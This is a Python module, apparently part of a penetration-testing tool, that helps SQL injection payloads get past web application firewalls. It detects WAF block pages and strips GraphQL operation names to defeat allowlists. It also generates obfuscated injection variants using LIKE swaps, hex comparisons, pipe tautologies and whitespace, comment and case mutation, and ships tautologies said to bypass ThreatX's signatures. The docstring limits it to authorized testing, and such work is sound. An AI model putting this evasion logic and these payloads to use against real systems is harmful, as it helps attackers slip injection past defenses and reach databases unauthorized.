"""WAF-evasion transforms for authorized testing of WAF-fronted targets.

Signature WAFs (ThreatX/Cloudflare/…) block on request *content*, not just IP.
When an attack request comes back as a WAF block, retrying with an obfuscated —
but semantically equivalent — payload often slips past the signature and reaches
the app. These transforms are empirically tuned against ThreatX's GraphQL demo
(dvga.xplat-demo.threatx.io): classic ``1 OR 1=1`` / ``UNION SELECT`` are blocked,
while ``LIKE`` comparisons, hex-encoded compares, and ``||`` logic get through.

Use only against targets you're authorized to test. This is standard pentest
tradecraft (mirrors sqlmap's tamper scripts), not a covert-evasion tool.
"""
from __future__ import annotations

import re

# Body substrings that mark a WAF block page (vs a normal app response). Kept
# broad — different WAFs word it differently — and paired with a 403 status.
_WAF_BODY_MARKERS = (
    "forbidden", "request blocked", "access denied", "attention required",
    "threatx", "cloudflare", "akamai", "incapsula", "mod_security", "406 not acceptable",
)


def looks_like_waf_block(status: int, body: str) -> bool:
    """True when a response is (very likely) a WAF block rather than the app.

    403/406 with a block-page body, or a bare 403 with an HTML error doc. A
    normal GraphQL app returns 200/400 with JSON, so this rarely false-fires.
    """
    if status in (403, 406, 429):
        b = (body or "").lower()
        return any(m in b for m in _WAF_BODY_MARKERS) or "<html" in b or "<!doctype html" in b
    return False


# ---------------------------------------------------------------------------
# GraphQL: strip operation names (defeats operation-name allowlists like DVGA's
# "Operation Name X is not allowed"). `query IntrospectionQuery {…}` → `query {…}`.
# ---------------------------------------------------------------------------
_OP_NAME_RE = re.compile(r"\b(query|mutation|subscription)\s+[A-Za-z_]\w*")


def strip_operation_name(query: str) -> str:
    """Remove the operation name, keeping the operation keyword + var defs.

    ``query IntrospectionQuery($x: Int) { … }`` → ``query ($x: Int) { … }``.
    Anonymous ops bypass name-based allowlists while staying valid GraphQL.
    """
    return _OP_NAME_RE.sub(r"\1", query, count=1)


# ---------------------------------------------------------------------------
# SQLi payload obfuscation — semantically-equivalent variants that dodge
# signature matching. Order = most-reliable-first (empirically vs ThreatX).
# ---------------------------------------------------------------------------
def sqli_evasion_variants(payload: str) -> list[str]:
    """Return obfuscated variants of a SQLi payload, most-reliable first.

    Semantics preserved: each variant is the same boolean/UNION intent expressed
    to avoid the WAF's signature (``=`` → ``LIKE``, hex compares, ``||`` logic,
    whitespace/comment mutation). De-duped; the original is intentionally NOT
    included (the caller already tried it and got blocked).
    """
    variants: list[str] = []

    def add(v: str) -> None:
        if v and v != payload and v not in variants:
            variants.append(v)

    # `=` → `LIKE` (ThreatX lets LIKE comparisons through).
    add(re.sub(r"\s*=\s*", " LIKE ", payload))
    # Numeric equality → hex compare: `1=1` → `0x31=0x31`.
    def _hex_eq(m: re.Match) -> str:
        a, b = m.group(1), m.group(2)
        return f"0x{a.encode().hex()}=0x{b.encode().hex()}"
    add(re.sub(r"(\d+)\s*=\s*(\d+)", _hex_eq, payload))
    # Tautology via `||` (pipe) instead of `OR ...=...`.
    if re.search(r"\bor\b", payload, re.I):
        add("1||1")
    # Whitespace mutation: spaces → newlines (WAF regexes often assume spaces).
    add(payload.replace(" ", "\n"))
    # Inline comment splitting of the OR/UNION keyword.
    add(re.sub(r"\b(or|and|union|select)\b", lambda m: "/**/".join(m.group(0)), payload, flags=re.I))
    # Case mutation.
    add(re.sub(r"\b(or|and|union|select)\b", lambda m: m.group(0).swapcase(), payload, flags=re.I))
    return variants


# Curated tautologies known to bypass ThreatX's GraphQL SQLi signature — used
# when the caller has no specific payload, just wants a boolean-true injection.
SQLI_BYPASS_TAUTOLOGIES: tuple[str, ...] = (
    "1 OR 1 LIKE 1",
    "1 OR 0x31=0x31",
    "1||1",
)
